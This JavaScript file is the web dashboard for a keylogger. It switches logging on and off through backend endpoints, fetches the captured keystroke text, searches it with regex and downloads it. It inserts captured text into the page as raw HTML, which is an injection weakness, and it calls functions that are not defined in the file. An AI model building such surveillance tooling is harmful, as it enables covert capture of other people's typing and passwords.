// Define references to DOM elements used in the application
const elements = {
    fetchBtn: document.getElementById('fetch-button'),
    loaderIcon: document.querySelector('.loader-btn'),
    loaderBtnText: document.getElementById('loader-btn-text'),
    toggleFetch: document.getElementById('channelToggle'),
    channelInput: document.getElementById('channelInput'),
    label: document.getElementById('fetchLabel'),
    textDisplay: document.getElementById('textDisplay'),
    searchInput: document.getElementById('searchInput'),
    regexToggle: document.getElementById('regexToggle'),
    regexInput: document.getElementById('regexInput'), // Added reference for regexInput
    selectedChannel: document.getElementById('selectedChannel')
};

// Define backend endpoint URLs
const urls = {
    startLogger: "/klgon",
    stopLogger: "/klgoff",
    fetchData: "/klg"
};

let intervalId = null;
let countdownIntervalId = null;
const fetchIntervalSeconds = 10;
let countdown = fetchIntervalSeconds;
let originalText = "";

// Initialize the application when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', () => {
    initEventListeners();
    if (elements.toggleFetch.checked)
        startKeylogger();
    else
        stopKeylogger();
});

elements.toggleFetch.addEventListener('change', function () {
    elements.channelInput.value = this.checked ? 'ON' : 'OFF';
    if (this.checked)
        startKeylogger();
    else
        stopKeylogger();
})

function toggleFetchButton() {
    if (elements.toggleFetch.checked) {
        elements.fetchBtn.disabled = false;
    } else {
        elements.fetchBtn.disabled = true;
    }
}

// Set up event listeners for user interactions
function initEventListeners() {
    toggleSearchListener(!elements.regexToggle.checked);

    elements.regexToggle.addEventListener('change', () => {
        toggleSearchListener(!elements.regexToggle.checked);
        elements.regexInput.value = elements.regexToggle.checked ? 'RegEx' : 'Normal';
        elements.textDisplay.innerText = originalText;
    });

    elements.channelInput.addEventListener('change', async () => {
        if (elements.channelInput.checked) {
            await startFetching();
        } else {
            await stopFetching();
        }
    });

    elements.searchInput.addEventListener('keypress', (event) => {
        if (event.key === 'Enter') {
            updateSearchResults();
        }
    });
}

// Add or remove search input listener based on toggle state
function toggleSearchListener(enable) {
    if (enable) {
        elements.searchInput.addEventListener('input', updateSearchResults);
    } else {
        elements.searchInput.removeEventListener('input', updateSearchResults);
    }
}

function startKeylogger() {
    toggleFetchButton();
    fetch(urls.startLogger, { method: 'POST' });
}

function stopKeylogger() {
    toggleFetchButton();
    fetch(urls.stopLogger, { method: 'POST' });
}

// Fetch keylogger data from the server
async function fetchKeyloggerData() {
    if (elements.channelInput.value !== 'ON')
        return;
    elements.loaderIcon.classList.add('rotating');
    elements.loaderBtnText.textContent = "Fetching...";
    try {
        const response = await fetch(urls.fetchData);
        if (!response.ok) throw new Error('Network Error');

        const text = await response.json();
        originalText = text;

        if (!elements.regexToggle.checked) {
            updateSearchResults(); // Perform search if regex toggle is disabled
        }
    } catch (err) {
        console.error('Error fetching data:', err);
        alert("Failed to fetch data. Please try again later.");
    } finally {
        elements.loaderIcon.classList.remove('rotating');
        elements.loaderBtnText.textContent = "Fetch data";
    }
}

// Search the fetched text based on user input
function updateSearchResults() {
    const query = elements.searchInput.value.trim();
    const useRegex = elements.regexToggle.checked;

    // If search query is empty, reset the display
    if (!query) {
        elements.textDisplay.innerText = originalText;
        return;
    }

    let regex;
    try {
        regex = new RegExp(useRegex ? query : escapeRegex(query), 'gi');
    } catch {
        alert("Invalid Regular Expression");
        return;
    }

    // Filter and highlight matching lines
    const lines = originalText.split('\n');

    const highlighted = lines.filter(line => regex.test(line)).map(line => {
        return line.replace(regex, match => `<span class="highlight">${match}</span>`);
    });

    // Update match count and displayed text
    elements.textDisplay.innerHTML = highlighted.join('\n');
}

// Escape special characters in a string for safe regex usage
function escapeRegex(string) {
    return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

// Utility: Start an interval and immediately execute callback
function startInterval(callback, ms) {
    callback();
    return setInterval(callback, ms);
}

// Download the displayed text as a file
function downloadText() {
    const blob = new Blob([elements.textDisplay.textContent], { type: 'text/plain' });
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = 'content.txt';
    link.click();
}
